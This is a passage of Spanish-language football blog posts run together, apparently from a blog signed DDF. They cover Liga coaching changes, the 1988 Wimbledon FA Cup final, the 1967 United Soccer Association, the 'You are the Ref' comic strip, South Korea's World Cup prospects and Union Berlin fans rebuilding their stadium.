tan frecuentes las goleadas. Diríamos que la gran batalla se disputará el próximo 21 de Abril en el Camp Nou, si no fuera porque es bastante posible que este partido quede en nada ante lo que puede ser la final de la Champions. Se ha analizado tanto sobre todo esto que parece que sólo podemos hacer ya literatura sobre ello, pero siempre resulta interesante recordar que el Madrid tiene dos salidas conflictivas, al otro lado del Manzanares y a Bilbao, que seguramente decidirán el campeonato. Cuando acabe el Clásico lo tendremos todo mucho más claro. O no. Quién sabe si volveremos a verlo sobre un terreno de juego, y si su exhibición ante el Madrid fue la última de una carrera eterna. Filippo Inzaghi, de quien diríamos que es quizá el mayor cazagoles en activo si necesitase presentación, se ha roto el ligamento cruzado en el partido que enfrentó ayer al Milan con el Palermo, y se pierde el resto de la temporada por culpa de tan grave lesión. Haciendo gala del espíritu indomable que siempre lo ha caracterizado en el terreno de juego, sus primeras palabras han sido de resistencia a la fatalidad y confianza en el regreso, así como de agradecimiento a toda la gente que ha brindado su apoyo en esta hora dura. Su ausencia, esperemos que relativamente breve, va a hacerse notar, por cuanto Superpippo es una de esas presencias que siempre han estado ahí desde que muchos tenemos uso de razón futbolística. Mucho ánimo para él. Alemania. Tercer puesto. Cinco victorias y dos derrotas, con dieciséis goles marcados y cinco recibidos.Una buena marcha copera. Aquel Hércules que cabalgó las primeras olas con brío es desde hace tiempo un barquito en la bañera girando y girando camino del desagüe. Se desmenuza a cada giro, tiene la peor de las pintas y como navega ya en la cola tras apilar cuatro golpetazos consecutivos sus dueños han decidido comenzar a liberarlo de lastres. La cosa viene de largo pero el detonante fue lo del domingo ante el Osasuna en casa. Los pamplonicas hicieron y sobre todo deshicieron, ahí está un 0-4 tan significativo como demoledor para atestiguarlo, y abrieron un boquete de proporciones considerables en la nave por el que ya se ha colado Esteban Vigo.Tan fundido fisicamente, escasamente trabajado y ramplón en función de su potencial como vienen presentándose en las últimas fechas los locales tuvieron que escuchar en boca de los suyos los olés con sorna y todas esas lindezas que anticipan la mortaja futbolística. Imaginen la temperatura del asunto cuando un Farinós ya mayorcito para estas tonterías se permitió responder a la masa soberana, el principal y más digno activo del club, con un corte de mangas… El caso es que la directiva ha decidido que el Hércules necesita un nuevo patrón y el boquerón, cuestionado en lo deportivo y en lo extradeportivo desde hace tiempo, ya es historia. Veremos, pero que en la libreta se haya escrito el nombre de técnicos tan dispares como Victor Fernández, Víctor Muñoz, Manolo Jiménez, Bielsa o Gorosito da idea de lo centrado que navega el buque de la mano de Enrique Ortiz…Y ojo porque esto puede ser poco menos que una marejadilla comparado con la que que le puede venir encima al club si da con sus huesos en la Segunda División. Seguramente es pronto para hablar, más que nada porque pienso que el Hércules tiene plantilla suficiente para aferrarse a la categoría, pero el club no estaría preparado para afrontar un escenario de segunda con deudas, compromisos y sueldos de primera. Más con la que está cayendo. Sencillamente peligra el futuro a medio plazo de la entidad con los dirigentes actuales. A mi me viene a la mente que lo que mal comienza, la consabida sombra del apaño o los excesos de nuevo rico en la contabilidad, mal acaba pero de todo eso sabe mucho más que yo Toni Cabot, redactor jefe de la sección de deportes en el Diario levantino Información. Lean que la cosa tiene miga. Cada quince días y de la mano de Classic Football Shirts: la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.A la relación de sucesos que seguramente tienen más de tradicionales o maravillosos que de históricos o verdaderos le llamamos leyenda. Y resulta reconfortante que algunas permanezcan impermeables a la realidad. La del Wimbledon campeón habla de como el equipo más chapucero de la historia fue capaz de birlarle la FA Cup al todopoderoso Liverpool. De como una criatura de alcantarilla se asomo al mundo real y mordió cuanto se puso en su camino.Era 1988 y el templo del tenis aparcó por un momento el deporte de alto copete para recibir a una panda de operarios que regresaban al barrio con el trofeo más codiciado bajo el brazo. La leyenda dice que lo hicieron con el kick and rush más cerril entre ceja y ceja, que los goles sucedían con la gracia aleatoria con la que se acumulan puntos en el pinball. ¿Nunca jugó bien aquel Wimbledon? Claro que sí pero es difícil pararse a pensar en ello teniendo en las manos aquella camiseta.Comandado por un presidente  que prometió comprarle un camello a su delantero estrella si era capaz de anotar 20 goles durante la temporada, aquella anomalía en azul y amarillo se presentó en Wembley. Allí estaban Dave Beasant, primer portero en lucir brazalete de capitán en una final de Copa y el primero en atajar un penalti en la cita trascendental, Goodyear, Phelan, Vinnie Jones, Eric Young, apodado el Ninja por su destreza en el centro de la zaga, Thorn, Terry Gibson, Alan Cork, el recordado John Fashanu, Lawrie Sánchez y el gran Dennis Wise.Imaginen como sería el cuadro, las expectativas, que tan solo Laurie Cunningham, que había ganado Liga y Copa con el Real Madrid ocho años antes, sabía lo que era levantar un título. No importó.Once sibaritas de la patada y el barullo frente a un señor equipo configurado a base de brillantes cromos como Alan Hansen, Peter Baerdsley o John Barnes. Nadie daba un duro por los de azul. Hasta el minuto 37. Entonces Beasant mandó la pelota a ochenta metros de su propia área y el balón se acostó en el corner izquierdo. Terry Phelan arañó un tiro libre y Dennis Wise, un tipo tan competente para la patada como para engendrar fútbol, supo barnizar de delicadeza el duelo con un centro medido que Lawrie Sánchez peinó al fondo de la portería. A partir de ahí, después de aquel maravilloso minuto 37 en Wembley, un tobogán. El Wimbledon aguantó, presionó, rascó, levantó el único título de tu miserable historia, le prohibieron pasear su diferencia por Europa y languideció hasta desaparecer por la misma alcantarilla de la que había salido. Just Wimbledon, ¿Pura leyenda? . Puedes comprar esta camiseta y cientos más en Classic Football Shirts. DDF con la pala de arqueólogo, soplando el polvo a la gema y rescatando a cuenta del Milan-Tottenham la primera y última ocasión en que el diablo se enfrentó al judío. La piecita tiene 38 años y aun brilla en el libro de historia spur. Todo sucedió en las semifinales de la Copa de la UEFA inaugural.Sobre el campo, honrando el prestigio de lo que entonces era un gran torneo, leyendas como Pat Jennings, Alan Mullery, el mago Alan Gilzean. Esa dinamo que atendía al nombre de Karl-Heinz Schnellinger y el enorme Gianni Rivera. Imaginen que los londinenses habían quedado terceros en liga y el Milan subcampeón tras el Inter. Casi nada. Era Mullery el que compraba el billete a la final con un tanto en San Siro que servía para equilibrar la renta conseguida por Rivera desde el punto de penalti, pero en la retina de la hinchada spur quedará para siempre la victoria en White Hart Lane. 2-1, gracias a dos verdaderos golazos del eficiente Steve Perryman. Tottenham del 71, el que posteriormente sabría desvirgarse en asuntos del laurel europeo doblegando al Wolverhampton Wanderers. Pura leyenda. José Touré nunca habría ganado un balón de esos. Si acaso el de acodarse en la barra e inclinarse sobre las tapas de los inodoros con algo en la mano. Pero el negro que lideraba el ataque del Nantes en los setenta era un genio. Genio. La palabra goma se inventó para escribir metáforas sobre los tobillos de señores como Touré, hijo del marfileño Baku, al que apodaban el brasileño por algo. José descarriló cuando llegó al Monaco y 800.000 francos al mes no eran suficiente fajo en las noches calientes de Saint-Tropez. La Costa Azul fue blanca y un sumidero para aquel artista que ya había pintado sus mejores cuadros. Brilló más que la imposible camiseta del Nantes, ganó la liga con el gran Burdeos de finales de los ochenta  y faltó, por naturaleza propia, a las grandes citas con la selección francesa. Clase, regate, potencia y puntería. Esa fue su obra y un golazo al PSG en la final de Copa que merece la pena ver como nos lo enseña este vídeo furtivo. Perdiéndose en un mar de píxeles, ruido y malos encuadres va José Touré, un jugador que ya no importa. Seguro que recuerdan la mojiganga de Matt Groening a cuenta del fútbol europeo en la que se pinta el juego como una sartenada desabrida de patadas, bajos marcadores e incluso sí ¡empates! Yo me la encontré el otro día dando tumbos entre vídeos y apareció la risotada, claro, pero también ganas de consultar un par de datos sobre, perdonen la redundancia, aquel soccer primario. Y es que echar un vistazo hoy en día a la supervitaminada selección yanqui  e imaginarse que la escena futbolística norteamerica era, no hace demasiado tiempo, un páramo apenas aliñado con camisetas imposibles y estrellas otoñales puede resultar faena complicada para el profano. Pero era, vaya si era, y al particular panorama contyribuyo notablemente la United Soccer Association. La USA, esa anomalía.El caso es que un mes antes del nacimiento de la USA, en 1967, ya existía un campeonato oficial para el importado entretenimiento en los Estados Unidos. Era la National Profesional League Soccer y actuaba como un imán tanto para los pocos jugadores decentes de la nación como para los contratos televisivos. Los partidos de la NPLS, aun chapoteando en una falta de calidad casi pornográfica, eran ofrecidos para todo el país por la CBS. Quien sabe si frente a uno de aquellos televisores que escupían las retransmisiones del soccer primordial, estaba un joven y desconcertado Groening. Así las cosas, matería prima y canales de distribución en manos de la competencia, los ideólogos de la United Soccer Association buscaron soluciones drásticas para colocar su producto. ¿Comprar cromos más o menos otoñales y más o menos reputados? ¿Tirar la caña de pescar con fajo por cebo y procurarnos un Pelé o un Beckham aun útiles? Mejor, en la USA tiraron la casa por la ventana e importaron equipos completos. Doce planteles doce, principalmente británicos y sudamericanos. ¿Para quá tener solo un muñeco pudiendo agenciarse el fuerte de Playmobil al completo? . De este modo la frankenstiniana quiniela del campeonato USA 67 estaba compuesta por Los Angeles Wolves, en realidad el Wolverhampton Wanderers; los Cleveland Stokers (Stoke City), los Vancouver Royal Canadians (Sunderland), los Washington Whips (Aberdeen), los Dallas Tornado (Dundee United), los Toronto City (Hibernian), Boston Rovers (Shamrock Rovers), Chicago Mustangs (Cagliari), Detroit Cougars (Glentoran), Houston Stars (Bangu), New York Skyliners (CA Cerro), y los San Francisco Golden Gate Gales (ADO Den Haag). Aquel campeonato irrepetible se lo embolsaron los Wolves batiendo en la final al Aberdeen. La distinción al goleador más prolífico, solo las mentes más retorcidas pueden imaginar como denominarían allí al galardón aunque uno tiene en mente a Juanma Lillo repitiendo como un mantra las frases “campeón de goleo”, fue a parar a manos del gran Roberto Bonisegna. Un año más tarde los directivos de la United Soccer Association, sin duda decepcionados por una afluencia de espectadores que salvo en contadas excepciones fue discreta, dieron carpetazo al extraño invento uniéndose a la NSPL para parir la North American Soccer League y certificar con ello la defunción de una de las mayores extravagancias que ha dado el fútbol. Claro que aun queda alguna huella del experimento. Repesen la historia de la famosa camiseta naranja del Dundee United y aten cabos… Disculpen el abuso del vídeo ya de buena mañana pero sin tiempo para escribir una previa en condiciones del Manchester United-Marsella de esta noche me apetece al menos rescatar imágenes de la última ocasión en que las dos históricas instituciones se batieron en la arena de Old Trafford. Merece la pena porque en apenas dos minutos veremos a Denis Irwin trabajando la banda derecha con el porte de señor mayor que gastó siempre, como Andy Cole fabrica una belleza tras retorcerse en el aire, a Paul Scholes hacer buena la teoría del box to box y un auténtico golazo de Ibrahima Bakayoko haciendo migas con la escuadra. Por ejemplo. Era la fase de grupos de la Champions 99 y de nuevo un equipo francés, en once ocasiones ha sucedido lo mismo, erraba el asalto al teatro de los sueños. “¿Por qué no me amonestaron ni una sola vez en toda mi carrera? Tal vez fue debido a todas aquellas tardes leyendo “You are the Ref” cuando era un crío…”, Gary Lineker.Si pasásemos la mayor parte de partidos de la liga española por un imaginario medidor de antideportividad, el reciente Sporting de Gijón-Real Madrid sin ir más lejos nos serviría, no le daríamos a la aguja del cachivache ni un maldito momento de respiro. Uno no se extraña de nada porque si algo somos en España es brutitos devotos y si algo le gusta al español es ganar a base de astucias en el sentido más oscuro del término. Prácticamente en cada jornada vemos codazos alevosos (la artimaña de moda de unos años a esta parte) zancadillas arteras, intolerables actitudes de según que futbolistas para con el árbitro y sus rivales, saltos a la piscina que harían trempar al jurado más experto en las artes natatorias, periódicos que acosan a los árbitros, parroquianos con un talento especial para el agravio, entrenadores que hacen de la marrullería más obscena una marca de fábrica… En resumen, una retahíla apestosa de ataques a los principios básicos de convivencia que deberían regir cualquier deporte. Y el caso es que reflexionando sobre esta sartenada de malas artes pienso, ¡Qué bien le vendría al fútbol español un “You are the Ref“! ¿Pero qué es “You are the Ref”? Dibujada por el pincel maestro de Paul Trevillion y escrita por los principales árbitros ingleses, “You are the Ref” es una tira deportiva que lleva entreteniendo y educando al hincha británico desde su debut en 1957. En cada entrega, actualmente las publica el Guardian y se han convertido en objeto de culto, se plantean una serie de dilemas arbitrales (situaciones inverosímiles del juego y alguna incluso tirando al hardcore) que colocan al espectador exactamente en la embarazosa posición del trencilla. Evidentemente las tiras no incorporan un pequeño altavoz que escupa alusiones cariñosas a tu familia o puntualizaciones sobre la graduación de tus gafas pero te ponen justo cara a cara con la duda. Y educan, vaya si lo hacen. Uno que es lector del asunto desde que el Guardian comenzó a colgarlas en su versión digital e incluso se ha comprado varios volúmenes que recopilan la obra de Trevillion les jura, sobre el silbato de Collina, que ha aprendido a mirar a los árbitros con otros ojos.Volviendo al principio del artículo, si fuese directivo de cualquier club español y quisiera gastarme el dinero en algo honesto no dudaría en destinar parte del presupuesto a encargar un “You are the Ref” patrio a cualquier buen dibujante.No es la primera vez que el meta madrileño salva los muebles a los suyos en la presente temporada. Contra el Real Madrid, resistió sin excesivos apuros el asedio de la segunda mitad. Se mostró segurísimo en los balones altos y eléctrico en los remates dentro de área pequeña (particularmente, en un balón que consiguió sacar a Benzema de forma inverosímil). Buena parte del mérito del empate bético recae sobre sus guantes.Aritz Aduriz. Hace tres o cuatro años corría una frase en boca de los aficionados con respecto a Radamel Falcao. ‘Si cae una lavadora en el área, te la remata a puerta‘. Con el colombiano atravesando un túnel sin aparente salida, el nueve del Athletic se ha erigido en el rematador por excelencia de nuestro fútbol. Contra el Eibar hizo dos tantos, a cada cual más espectacular, exhibiendo una capacidad para el remate fuera de lo común. Si no tuviera 34 años, sería uno de los jugadores más cotizados del momento.Rubén Rochina. Con su actuación del sábado ante el Getafe contribuyó de manera notable a salvar el cuello de Sandoval. Propició el segundo gol granadino, al aprovechar El Arabi un rechazo a un disparo suyo, y decantó finalmente la balanza del lado nazarí con un zurdazo que resquebrajó las redes de Guaita. Desde su posición de mediapunta, resultó decisivo en el tramo final del partido.Eduardo Berizzo. Cumplió lo que prometió tras el partido de ida de los cuartos de final de la Copa y se presentó en Vallecas con el equipo B del Celta. Fue fiel a su planteamiento de la temporada y decidió dejar en Vigo (o en el banquillo) a buena parte de los futbolistas que mantienen a los celestes en posiciones europeas, priorizando un torneo copero del que no está ni mucho menos fuera. La primera parte de su apuesta salió por el lado lógico y los gallegos se llevaron una contundente derrota (3-0) del estadio vallecano. Será una derrota dulce si llega la hazaña en el Calderón. Víctor Fernández me suena a otra época. A años de bonanza en los que los modestos podían armar buenas plantillas, ponerse el disfraz de equipo poderoso y salir a tratar de jugar al fútbol como los ángeles. A pelear incluso por títulos. Había dinero, quizá a costa para muchos de vivir por encima de sus posibilidades reales, y mimbres para ello. Víctor encontró en aquellos Zaragoza, Celta y Betis que se beneficiaron de la notable inyección económica que supuso para los clubes de mitad de tabla la negociación de los contratos televisivos el acomodo ideal para el desarrollo de su propuesta futbolística. Porque para jugar bien al fútbol se requieren buenos futbolistas capacitados para ello. Fue así como Víctor Fernández se hizo un nombre, depositando sus convicciones de juego y estilo en jugadores como Gustavo Poyet, Santi Aragón, Mostovoi, Karpin o Mazinho. El día y la noche comparado con aquello a lo que ahora puede aspirar desde el banquillo del Deportivo.Tal vez por eso la noticia de su contratación por parte del club herculino, en sustitución del repentina y controvertidamente destituido Fernando Vázquez, me sonó a mensaje caduco. A movimiento propio de otros tiempos, a rescatar de la duermevela deportiva a un técnico cuyo ideario tenía difícil acomodo en un equipo cuyo objetivo primordial era la salvación de una categoría recién recuperada. Esto es, tratar de encajar pocos goles, rentabilizar al máximo los previsiblemente escasos tantos anotados y hacerse fuerte en casa. El ABC de la lucha por la permanencia.Figuras como la del técnico aragonés han quedado un poco fuera de sitio. Es un perfil quizá algo desfasado. Ese ‘jugar bien y ganar‘ es cada vez una misión más inaccesible, porque las plantillas apenas reúnen efectivos para tratar de sobrevivir en cualquier condición. Aquellos clubes que eran su hábitat ideal, sin excesivas exigencias y con un cierto margen de crecimiento, con disponibilidad económica para confeccionar plantillas relativamente poderosas y que darían por buena una simple clasificación europea, ya no existen porque el fútbol actual no tiene cabida para ellos. Y si existen, sus objetivos para ocupar el banquillo sobrepasan la figura de Víctor. Hoy jugar bien es un lujo al alcance de muy pocos. No, en ningún caso, de aquellos cuya plantilla no permite dispendios.El Deportivo ocupa plaza de descenso a Segunda cuando se ha disputado más de un tercio del campeonato. Ha encajado la considerable cifra de veinticuatro goles y apenas ha conseguido anotar doce, con una preocupante racha de cuatro jornadas consecutivas sin poder marcar un solo tanto. Si Víctor no consigue enderezar la situación del equipo de inmediato, la trayectoria reciente amenaza ruina. De momento, ya arrecian potentes gritos en su contra desde el graderío y el choque ante el Elche de la próxima semana se anuncia como un ultimátum. Como la confirmación, cuatro meses después, de que la contratación de Víctor era una noticia de otra época. Juan Carlos Garrido deja de ser el entrenador del Real Betis. Como suele ser costumbre, el canal de comunicación oficial del club bético no profundiza demasiado en explicaciones. Se limita a confirmar lo que casi todo el mundo sospechaba desde las seis de la tarde del sábado, añadiendo que el entrenador ‘no ha obtenido los resultados deseados‘. Si no fuera porque la gran mayoría de la afición verdiblanca preveía lo que iba a ocurrir cuando el club decidió prescindir de Pepe Mel y anunciar de inmediato la contratación del técnico valenciano, uno hubiera sido comprensivo con la directiva de Heliópolis. Un error lo tiene cualquiera. Incurrir en uno sobre el que has sido advertido repetidas veces entra dentro del ámbito de la inconsciencia y la irresponsabilidad.Juan Carlos Garrido apenas ha podido sentarse en el banquillo del Betis en nueve partidos. Uno de Europa League, tres de Copa y cinco de Liga. El bagaje no puede ser más triste, con apenas una victoria (en la ida de la eliminatoria copera ante el Athletic, que de poco le sirvió) y tres empates (uno de ellos frente al Lleida, también en Copa). El equipo jamás dio la sensación de haber reaccionado ante el supuesto estímulo que siempre supone un cambio de entrenador. Puede que el ambiente pesara demasiado, que la plantilla, al igual que la grada, tuviera una confianza ciega en Mel y que la destitución de éste fuese tomada poco menos que como una especie de traición hacia la integridad del grupo. No suena descabellado pensar que Garrido fuese visto como un ‘intruso’ en ese vestuario, en vista de la clara pérdida de autoridad y jerarquía del técnico sobre sus futbolistas.Lo que es innegable es que el paso de Garrido por el Betis, por los motivos que fuere, sólo ha reportado tensión, tirantez, varias salidas de tono de todo punto inapropiadas, una delicada sospecha de comisiones en el fichaje de Baptistao y lo que es aún más importante: perder mes y medio en su cada vez más extenuante carrera por la salvación. Sobre lo de rendir responsabilidades por decisiones erróneas no forzadas mejor ya hablamos otro día. Hoy quiero hacer una confesión. Un trauma futbolístico atormenta mi existencia y sacude mi espíritu de hincha fiel desde que mi pasión balompédica tiene uso de razón. He visto a mi equipo ganar ligas y copas, me he tambaleado al borde del precipicio perdiendo años de vida cuando su histórica permanencia en Primera división estuvo pendiendo de un fino hilo, he disfrutado paseando con orgullo por varios estadios europeos con una camiseta roja y blanca como símbolo de identidad, … Pero hay algo que me falta y que, para gran desazón mía, sé que nunca podré experimentar. Nunca sabré lo que es vivir un derbi. Y no hay manera de poder solucionarlo.Me explico.Siempre he observado esos partidos entre dos equipos de una misma ciudad con ese disimulado interés de quien observa a su vecino aparcando un Mercedes en su plaza de garaje, mientras trata de aparentar que tiene cosas más importantes que hacer que detenerse a admirar (y envidiar) el cochazo. Ah, sí, un derbi. Que jugáis contra el otro equipo de la ciudad y que todo se paraliza.La eliminación de Champions de algunos equipos grandes, Liverpool o Juventus, también enriquecerá el campeonato que hoy se reanuda.Tras su celebrada final de Copa, el Atlético está en condiciones anímicas de afrontar su periplo europeo con algo más de entusiasmo que el mostrado hace unos meses. La Europa League ha pasado de ser una pesada carga a convertirse en un test de lujo para mostrar la mejora del equipo. El problema es que el rival que les ha tocado en suerte no es precisamente fácil. Mi apuesta, al principio de campeonato, es que el Galatasaray de Rijkaard era candidato a ganar el trofeo. Es un equipo que mezcla bien veteranía con juventud y que está jugando con cierta claridad en su liga doméstica. Hoy vendrán sin Kewell, ni Baros, ni el nuevo fichaje Dos Santos, pero tendrán a Elano, Arda Turan, o al viejo conocido Leo Franco en la portería.El Anderlecth y el Brujas no son dos equipos especialmente rocosos. Llevan años lejos de los puestos dorados del fútbol europeo –el Standard de Lieja les ha restado cierto protagonismo- pero sin embargo en este momento son primero y segundo de la Jupiler League belga. El Athletic está cuajando una buena temporada, con algunos vaivenes, pero con un estilo consolidado y atornillado por Caparrós, además juegan en casa, es un buen momento para mostrar al equipo por el continente. Ya se habla, por cierto, del duelo Muniaín-Lukaku, dos de las mayores promesas del fútbol europeo. El Valencia lo tendrá aún más fácil en Brujas. Es mejor equipo y está en un momento de forma encomiable. No pasar sería un fiasco porque el equipo ché debe ser al menos semifinalista de este torneo, por plantilla no me cabe la menor duda.Por último, el experimental equipo de Garrido tendrá frente a sí a un buen equipo alemán, el actual ganador de la Bundesliga, el Wolfsburgo. Cierto que tras su machada del año pasado esta temporada anda un poco descarriado. Primero cayendo en Champions y después naufragando fin de semana tras fin de semana en la liga de su país. Sin embargo, la aportación de Dzeko, Martins, Grafite, Ziani o Misimovic no puede tomarse demasiado a la ligera. El Villarreal no atraviesa su mejor momento tras el cambio de entrenador y tampoco es aquel equipo que deslumbró en Europa hace unos años. Un buen partido, en todo caso, que podría haberse dado en la Liga de Campeones sin demasiados retoques.Ajax – Juve, Panathinaikos – Roma, Hamburgo – PSV o Fulham – Shakhtar son otros de los choques que hoy dejarán a buen seguro destellos de calidad futbolística a la sombra del gigante europeo. Leo una entrevista a Julio Alberto en El Mundo en la que habla de su libro de memorias. Los que son, o han sido, yonkis siempre tratan su experiencia con la droga de una forma existencialista y absoluta. Hay un camino chamánico, de luces y sombras, una espiritualidad llena de heridas, de recuerdos, de reflexiones para la humanidad. No se limitan a contar sus muchas miserias, sus hurtos y sus fracasos. Eso sería demasiado sencillo. Es mejor engalanar la realidad con literatura emocional y frases para colocar sobre la foto de un amanecer.No hay nada más vulgar que la droga, nada menos espiritual que abandonarse a su placer instantáneo. La adicción te destroza, te vacía por dentro. Cambia el eje de la vida, todo gira en torno a la siguiente dosis. La droga no tiene amigos, ni caminos redentores. Es primaria y absoluta. Las drogas son una cueva en la que siempre se está a oscuras.La realidad no puede estropear una buena historia.Ayer Luis Enrique dijo en la rueda de prensa tras el partido que el Barcelona había perdido injustamente los últimos partidos. La injusticia es como una túnica: dentro cabe de todo, desde los argumentos más escuálidos a las reivindicaciones más rotundas. En mi concepto de justicia hay espacio para equipos que han perdido la chispa, para futbolistas talentosos que dejan temporalmente de ser decisivos. Hay espacio para el cansancio, para los méritos del rival, hasta para la suerte encuentro acomodo.Ondear la bandera de la injusticia habla más de uno mismo que de los demás. Es convertir tu historia en una narración épica, de héroes y villanos. Una soberbia antibalas. Convertir las derrotas en una victoria de la sombra frente a la luz. Quitarle méritos al enemigo, no asumir los errores, novelar los pesares. Darle la vuelta a la tortilla. Lanzar mensajes absolutos. Perder es algo vulgar, en el fútbol lo extraordinario es ganar siempre. Las derrotas son una cueva en la que siempre se está a oscuras. Como las viejas que se amontonan tras una valla para gritar “guapa” a la reina Letizia, algunos madridistas aplaudieron a Iniesta. No hubo pipas suficientes para calmar al Bernabéu. Los turistas sonreían como si hubieran visto un musical, para ellos el partido siempre es lo de menos. Son los mismos que van al Prado y se lo ven entero en una mañana. Los turistas se hicieron fotos ignorando la tragedia. Como Carlos Herrera, pero sonriendo en vez de morderse los pómulos. Hay obreros de derechas, hay heavies calvos y hay madridistas pro Florentino. El Bernabéu fue el teatro en el final de Dirty Dancing. El Barcelona un imperial Patrick Swayze y el Madrid la torpe y timorata Jennifer Grey. Allí se bailó porque uno quiso. Florentino es el Dr. Jake Houseman, el padre rígido que no quiere que su hija enseñe pechuga. En su cerrazón y su disparatada planificación deportiva podemos encontrar la respuesta a la pregunta: ¿Qué mierda es esta?Cristiano Ronaldo es como el cocinero de Ratatouille, es decir, debe esconder una rata bajo la equipación que es la que le guía los movimientos. Si no es inexplicable su apatía en un equipo que, hombre por hombre, debería aportar algo más. Diluida la beatificación de Keylor Navas y con Casemiro inexplicablemente en el banco, el Madrid no tenía más argumento que las genialidades de Gareth Bale. No. Es broma.Al principio de cada temporada colocaría un montoncito en cada vestuario, en cada despacho, y lo incluiría como lectura obligada para todos los futbolistas y empleados que estuviesen bajo el paraguas de mi club. Por narices. Si alguno recuerdan como aquellas insoportables lecturas que nos obligaban a llevar bajo el brazo en el colegio le ayudó a interesarse por la cultura comprenderá lo que digo.You are the Ref en The Guardian El seleccionador coreano, Huh Jung-Moo, es un hombre capital en el fútbol surcoreano. Tiene ese algo incientífico, Lillo mediante, que llamamos aura. Quizá porque cuando Corea iba camino de Argentina 86 y necesitaba tan sólo un golito  frente a los japoneses, era el último partido y habían sido derrotados por 2-1 en Tokio, para volver al mundial 32 años después de su única participación apareció Huh Jung-Moo. Marcó y desde aquel 3 de noviembre de 1985 en Seúl, los guerreros de Taeguk  no han faltado a la cita mundialista. Ya como seleccionador nacional, ésta es sus cuarta etapa al frente del equipo, ha tenido que lidiar con lo extradeportivo en demasiadas ocasiones. Sin embargo, ha salido intacto de la pelea. La Federación le ha movido la silla en más de una ocasión, la prensa le  acribilló sin piedad cuando decidió remodelar el equipo nacional a base  de jóvenes semidesconocidos y siempre ha cargado con la pesada cruz de  llegar al cargo tras el legendario Guus Hiddink, y ahí sigue. Logrando la clasificación con solvencia y modelando un buen equipo que puede dar muchas alegrías en el futuro. ¿En Sudáfrica? No nos engañemos, los surcoreanos lo tienen complicado…La selección de Corea de Sur es una de las niñas bonitas de los amigos de la parabólica. Basta seguir el reguero de saliva en el que como en una sopa Haejangguk, flotan extraños nombres como Ji-Sung Park, Sung-Yueng Ki o Chung-Yong Lee, para llegar al experto periodista. Los enésimos diablos rojos del fútbol mundial lo tienen todo para enamorar: nacieron en un país recóndito, gozaron de su pequeño momento de gloria emergente en un Mundial, alguno despunta ya en Europa, son carne de la sección futuras promesas en cualquier blog…Un filón. Yo, imagen del común de los aficionados, apenas he visto un par de partidos de Corea y reconozco que me gustaron ciertos valores del equipo. Disciplina, ritmo, una defensa aceptable y buen pie en el centro del campo. Otros me hicieron dudar, en particular la poca mordiente ofensiva. Pero a tenor de lo visto, consciente del excelente futuro que parece aguardarle al equipo y aun riesgo del reproche parabólico creo que, dada la complejidad del grupo en el que van a tener que vivir durante los próximos tres partidos, deberían darse con un canto en los dientes si consiguen plantarse en la ronda de octavos.Luego está el aliciente de ver a las dos Coreas, la del norte ha logrado una clasificación histórica, disputando el mismo Mundial en paz. Y de si esto servirá para aliviar las tensiones políticas entre ambos estados. En marzo la fragata de combate Cheonan se hundió llevándose consigo la vida de 46 soldados surcoreanos. El gobierno de Seúl responsabilizó públicamente del hundimiento a Corea del Norte y desde entonces el aire de la frontera se puede cortar con un cuchillo. Se han suspendido las relaciones comerciales, la maquinaria propagandística a toda máquina en ambos ejecutivos, el futuro pinta negro… Aunque hay esperanza  “El fútbol puede transformar las cosas y quizá sirva para acercarnos a Corea del Norte tras el Mundial”. Así lo desea Ji-Sung Park, estrella y referente indiscutible en el país asiático desde su explosión en el Manchester United en 2005, y así lo esperamos todos.Lo mejor: organización y buen toque en el centro del campo. En el equipo hay varios jugadores con buena técnica y movilidad.Lo peor: debilidad en la vanguardia pese al trabajo de los dos puntas.Jugador a seguir: hablan maravillas de Sung-Yueng Ki, centrocampista ofensivo del Celtic de Glasgow. Habrá que seguirle. Será el último mundial de Park.Pronóstico de DDF: octavosLos 23 mundialistas:Defensas: Centrocampistas: Delanteros: A diferencia del Támesis o del Sena, el Spree en Berlín es un río que no invita al recreo. Tiene caudal más que suficiente para la navegación y una muy adecuada quietud (uno no distingue bien hacia que lado se mueve la corriente), pero el principal cauce capitalino no ofrece demasiadas alegrías a los vecinos en su discurrir por la ciudad. Sin embargo, abandonando Berlín río arriba, el cuadro comienza a cambiar y muta en espacio de esparcimiento, dejando a su paso un puñado de rincones especialmente agradables. Treptow y sus pequeñas islas vacacionales con esos botes de remos, esos bonitos puentes y más allá aun el pueblo de Köpenick rodeado de lagos y bosques, en la isla que forma la confluencia del Spree y el Dhame. No resulta extraño que allí haya sucedido una hermosa historia de fútbol.Köpenick se levanta en la periferia oriental de Berlín como pueblo obrero, pesquero primero y fabril después. Los vecinos votan principalmente socialista y siguen con pasión los partidos del Union Berlin, que casualmente viste de rojo y en su día fue el equipo del sindicato de trabajadores en la República Democrática Alemana. El Union juega sus partidos en el Alten Försterei, un campo que parece sacado de un almanaque de estadios británicos. El AF es un recintocompacto, con capacidad para 20.000 almas, la grada besando el césped y una particularidad que elegra el gesto, tan sólo cuenta con 3.000 bútacas para que los hinchas puedan ver el fútbol sentados (las mínimas que exige la Bundesliga). Se llena cada domingo y es famoso por acoger una parroquia especialmente animosa y fiel. Un lugar delicioso para ver fútbol de pie.Sin embargo, hace cuatro años el Alten Försterei era una antigualla devorada por las malas hierbas que amenazaba con sepultar el futuro del club. Una postal corroída por el óxido y la nostálgica que el ayuntamiento se negaba a rescatar. Fue cuando los hinchas del Union, obreros en su inmensa mayoría, decidieron arremangarse y hacer lo que mejor saben. Cerca de 3.000 voluntarios coordinados por el club, esos carpinteros, electricistas y fontaneros que pueblan en su mayoría la grada del Försterei, acarrearon piedra podrida, acondicionaron las gradas, limpiaron a conciencia… Tan sólo dejaron a los operarios contratados tareas ciertamente más enjundiosas como la construcción de las cubiertas de tribuna. En julio de 2009, el Försterei resucitaba orgulloso en un partido amistoso contra el Hertha.En las orillas del estadio, sobre un icónico pilar de hierro, se encuentra un gran casco de obrero de color rojo. Como los colores de club. En él están grabados los nombres de los 3.000 hinchas seguidores que hicieron posible el milagro de Köpenick. Amanece en Glasgow y la gente se levanta del catre turbada, inquieta, con la sensación de que alguien les ha robado lo suyo. Y ahí está James, afeitándose mientras barrunta que esos españoles llevan años emperrados en clonarnos el campeonato de liga y al final lo van a conseguir. Que arrancaron replicando el duopolio abusón e inquebrantable, a lo Old Firm, que a continuación calcaron la diferencia abismal entre élite y clase baja y que lejos de contentarse con ello y para ponerle una guinda amarga al asunto, también nos han birlado el derby violento. Lo que yo te diga Jack, o nos inventamos alguna nueva o en un par de años nos veo preparando la maleta al sur porque esto de original 